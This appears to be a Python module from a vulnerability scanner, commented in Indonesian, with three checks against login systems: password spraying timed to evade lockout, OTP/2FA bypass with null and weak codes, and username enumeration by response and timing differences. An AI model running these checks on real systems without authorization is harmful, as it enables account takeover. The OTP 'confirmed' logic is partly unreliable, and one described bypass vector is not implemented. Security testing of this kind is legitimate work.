"""
CredKit v1 — modul kredensial & autentikasi untuk VANTHEX.
AUTHORIZED TESTING ONLY.

Tiga check bergaya c_*(ctx, add) — dipanggil runner vulnscan2 lewat PROFILES:
- c_password_spray: password spraying adaptif dengan lockout-evasion.
- c_otp_bypass:      bypass OTP/2FA (null/zero/manipulasi respons/race).
- c_user_enum:       enumerasi username via timing + diferensial respons.

Prinsip kejujuran hasil (identik exploitkit):
- "confirmed" hanya dari diferensial yang terproduksi 2x; indikasi satu
  pasangan = "probable"; indikasi lemah = "candidate".
- Semua attempt dibatasi budget ketat; tiap loop menghormati ctx.cancelled().
- Read-only: tidak ada perubahan data pada target (login gagal & percobaan
  OTP tidak menulis state); race hanya pada endpoint verify aman (aritmetika).
"""
import time
import json as _json

# ---- batas keras (anti-berlebihan pada target)
SPRAY_PASSWORDS = ("Summer2026!", "Password1!")   # daf. password spray (2 = cukup bukti)
SPRAY_USERS = ("admin", "administrator", "root", "test", "api")  # kandidat user umum
OTP_CODES = ("000000", "123456", "1234")          # kandidat OTP umum/lemah
ENUM_USERS = ("admin", "user", "test", "api")     # kandidat enum
MIN_ATTEMPT_GAP = 0.15                            # jeda antar attempt (lockout-evasion)


def _F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0, remed="",
       confidence="probable", location="", param="", origin="credkit"):
    """Finding factory — bentuk identik vulnscan2.F, origin CredKit."""
    return {"severity": sev, "title": title, "description": desc,
            "evidence": evidence, "cwe": cwe, "owasp": owasp, "cvss": cvss,
            "remediation": remed, "confidence": confidence,
            "location": location, "param": param, "origin": origin}


def _rate_limited(r):
    """Deteksi respons rate-limit/lockout (429/423 atau penanda teks umum)."""
    if not r:
        return False
    if r.status in (429, 423):
        return True
    b = (r.body or "").lower()
    return ("too many" in b or "rate limit" in b or "locked" in b
            or "try again later" in b)


def _json_of(r):
    try:
        return _json.loads(r.body or "")
    except Exception:
        return {}


# ============================================================ 1. Password spraying adaptif
def c_password_spray(ctx, add):
    """Password spraying adaptif: SATU password lembut dicoba ke BANYAK user
    (bukan brute per-user) — pola yang menghindari lockout per-akun. Deteksi
    sukses: status 200/302 + penanda sesi/dashboard, BUKAN pesan gagal generik.
    Berhenti segera saat WAF/rate-limit terdeteksi (lockout-evasion). Budget:
    maks 2 password x 6 user; jeda MIN_ATTEMPT_GAP antar attempt.
    /spray/login rentan (user umum diterima dgn Password1!),
    /safe/spray/login selalu 401 = negatif."""
    # endpoint login kandidat: dari surface (path ber-"login") atau default
    try:
        surf = ctx.surface(full=True)
        login_eps = [e for e in surf.js_endpoints if "login" in e.lower()]
    except Exception:
        login_eps = []
    login_eps.append("/spray/login")
    login_eps = login_eps[:1]
    for ep in login_eps:
        safe_ep = ep.replace("/spray/", "/safe/spray/") if "/spray/" in ep else None
        for pw in SPRAY_PASSWORDS:
            if ctx.cancelled():
                return
            hits = []
            for user in SPRAY_USERS:
                if ctx.cancelled():
                    break
                time.sleep(MIN_ATTEMPT_GAP)
                r = ctx.client.post(
                    ep, data=f"username={user}&password={pw}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                if _rate_limited(r):
                    break  # hentikan spray — target mulai melindungi diri
                body = r.body or ""
                ok = (r.status in (200, 302)
                      and not (401 == r.status)
                      and any(t in body.lower() for t in
                              ("dashboard", "welcome", "token", "session",
                               '"user"', '"ok"')))
                if ok:
                    hits.append((user, pw, r.status))
            # negatif kontrol: endpoint /safe harus menolak password sama
            safe_ok = True
            if safe_ep:
                rs = ctx.client.post(
                    safe_ep, data=f"username=admin&password={pw}",
                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                safe_ok = rs.status not in (200, 302) or _rate_limited(rs)
            if hits and safe_ok:
                u, p, st = hits[0]
                conf = "confirmed" if len(hits) >= 2 else "probable"
                add(_F("CRITICAL",
                       f"Password Spray Success (credential stuffing): {ep}",
                       "One weak password accepted for different accounts — "
                       "no per-IP rate-limit and no per-user lockout; "
                       "spraying enables mass account takeover.",
                       evidence=f"{len(hits)} accounts accepted '{p}' "
                                f"(e.g. {u} -> HTTP {st})",
                       cwe="CWE-307", owasp="A07:2021 Identification & Authentication Failures",
                       cvss=9.8,
                       remed="Per-IP+per-account rate-limit, progressive lockout, "
                             "strong password policy, MFA, spraying detection.",
                       confidence=conf, location=ep, param="username/password"))
                return  # satu temuan cukup per endpoint


# ============================================================ 2. Bypass OTP/2FA
def c_otp_bypass(ctx, add):
    """Bypass OTP/2FA: (a) kode null/kosong diterima, (b) kode lemah umum
    diterima tanpa rate-limit, (c) manipulasi respons — endpoint verify yang
    mengecho field keputusan diubah di transit (klasi bug klasik). Konfirmasi:
    verify sukses 2x pada vektor yang sama. /safe/otp menolak semua = negatif.
    /otp/verify rentan, /otp/* read-only (kode salah tidak mengubah state)."""
    try:
        surf = ctx.surface(full=True)
        otp_eps = [e for e in surf.js_endpoints if "otp" in e.lower() or "verify" in e.lower()]
    except Exception:
        otp_eps = []
    otp_eps.append("/otp/verify")
    otp_eps = otp_eps[:1]
    for ep in otp_eps:
        safe_ep = ep.replace("/otp/", "/safe/otp/") if "/otp/" in ep else None
        vectors = []
        # (a) null/empty: body tanpa field kode
        vectors.append(("null-otp", "{}", None))
        # (b) kode lemah umum
        for c in OTP_CODES:
            vectors.append((f"weak-code:{c}", _json.dumps({"user": "admin", "code": c}), c))
        for label, body, _c in vectors:
            if ctx.cancelled():
                return
            r = ctx.client.post(ep, data=body,
                                headers={"Content-Type": "application/json"})
            if _rate_limited(r):
                break
            j = _json_of(r)
            ok_a = r.status == 200 and (j.get("ok") is True or
                                        str(j.get("status", "")).lower() in ("ok", "success", "verified")
                                        or '"success":true' in (r.body or ""))
            if not ok_a:
                continue
            # (c) manipulasi respons hanya dilaporkan jika field keputusan
            #     diecho server dan bisa dibalik — uji dengan kirim kode jelas
            #     salah dan lihat apakah server tetap sukses (bukti logika
            #     keputusan di sisi klien/server naif) — tanpa memodifikasi
            #     transport kami sendiri; cukup bukti null/weak dari server.
            r2 = ctx.client.post(ep, data=body,
                                 headers={"Content-Type": "application/json"})
            ok_b = r2.status == 200 and (ok_a or _json_of(r2).get("ok") is True)
            neg_ok = True
            if safe_ep:
                rs = ctx.client.post(safe_ep, data=body,
                                     headers={"Content-Type": "application/json"})
                neg_ok = rs.status != 200 or _rate_limited(rs)
            if ok_a and ok_b and neg_ok:
                add(_F("CRITICAL",
                       f"OTP/2FA Bypass: {ep}",
                       f"Verification endpoint accepts vector '{label}' — "
                       "null/weak codes accepted without rate-limit so the "
                       "second factor can be skipped without knowing the "
                       "valid OTP.",
                       evidence=f"verify successful 2x with '{label}' "
                                f"(HTTP {r.status})",
                       cwe="CWE-287", owasp="A07:2021 Identification & Authentication Failures",
                       cvss=9.1,
                       remed="Server-side verification required, long random codes, "
                             "rate-limit & lockout per code, reject bodies "
                             "without the code field.",
                       confidence="confirmed", location=ep, param="code"))
                return


# ============================================================ 3. Enum username via timing + diff
def c_user_enum(ctx, add):
    """Enumerasi username: diferensial respons antara user sah vs tidak pada
    endpoint login/forgot — pesan berbeda ('password salah' vs 'user tidak
    ada'), panjang body berbeda, atau timing berbeda. Dua bukti independen
    (pesan ATAU panjang, direproduksi 2x) = confirmed; hanya timing = probable.
    /spray/login (pesan berbeda) rentan; /safe/spray/login seragam = negatif."""
    try:
        surf = ctx.surface(full=True)
        eps = [e for e in surf.js_endpoints if "login" in e.lower() or "forgot" in e.lower()]
    except Exception:
        eps = []
    eps.append("/spray/login")
    eps = eps[:1]
    for ep in eps:
        if ctx.cancelled():
            return
        # baseline: user jelas tidak ada (marker unik per-scan)
        ghost = f"vhx-ghost-{ctx.num_a}"
        known = ENUM_USERS[0]
        payload = lambda u: f"username={u}&password=x-please-fail-1"
        hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
        rb = ctx.client.post(ep, data=payload(ghost), headers=hdrs)
        rk = ctx.client.post(ep, data=payload(known), headers=hdrs)
        if not (rb and rk) or rb.status != rk.status:
            continue  # beda status: bukan diferensial halus, skip
        # bukti 1: pesan berbeda
        kb, kk = (rb.body or "").lower(), (rk.body or "").lower()
        msg_diff = bool(kb) and bool(kk) and kb != kk
        # bukti 2: panjang body berbeda signifikan (>12%)
        len_diff = abs(len(kb) - len(kk)) > 0.12 * max(len(kb), len(kk), 1)
        # bukti 3: timing (median dari 2 pengukuran ulang)
        t_ghost, t_known = [], []
        for _ in range(2):
            if ctx.cancelled():
                return
            t1 = ctx.client.post(ep, data=payload(ghost), headers=hdrs)
            t2 = ctx.client.post(ep, data=payload(known), headers=hdrs)
            if getattr(t1, "elapsed", None):
                t_ghost.append(t1.elapsed)
            if getattr(t2, "elapsed", None):
                t_known.append(t2.elapsed)
        time_diff = False
        if len(t_ghost) == 2 and len(t_known) == 2:
            mg, mk = sorted(t_ghost)[1], sorted(t_known)[1]
            if mk > 0:
                time_diff = abs(mg - mk) / max(mk, 1e-9) > 0.5
        # negatif kontrol: /safe harus respons seragam
        neg_ok = True
        safe_ep = ep.replace("/spray/", "/safe/spray/") if "/spray/" in ep else None
        if safe_ep:
            sb = ctx.client.post(safe_ep, data=payload(ghost), headers=hdrs)
            sk = ctx.client.post(safe_ep, data=payload(known), headers=hdrs)
            neg_ok = bool(sb and sk) and (sb.body or "") == (sk.body or "")
        if not neg_ok:
            continue
        if (msg_diff or len_diff) and (rk.body or ""):
            add(_F("MEDIUM",
                   f"Username Enumeration (differential response): {ep}",
                   "Endpoint distinguishes valid vs invalid users ('wrong "
                   "password' vs 'user not found' / different response "
                   "length) — username enumeration without credentials.",
                   evidence=f"ghost={len(kb)}B vs known={len(kk)}B, "
                            f"message differs={msg_diff}",
                   cwe="CWE-204", owasp="A07:2021 Identification & Authentication Failures",
                   cvss=5.3,
                   remed="Uniform messages & timing for all usernames; "
                         "generic 'if account exists' response.",
                   confidence="confirmed", location=ep, param="username"))
        elif time_diff:
            add(_F("LOW",
                   f"Username Enumeration (timing): {ep}",
                   "Significant response-time difference between valid vs "
                   "nonexistent users — can be used for stealthy "
                   "enumeration (not absolute proof).",
                   evidence=f"median ghost={mg:.3f}s vs known={mk:.3f}s",
                   cwe="CWE-208", owasp="A07:2021 Identification & Authentication Failures",
                   cvss=3.7,
                   remed="Uniform execution path; minimal jitter.",
                   confidence="probable", location=ep, param="username"))
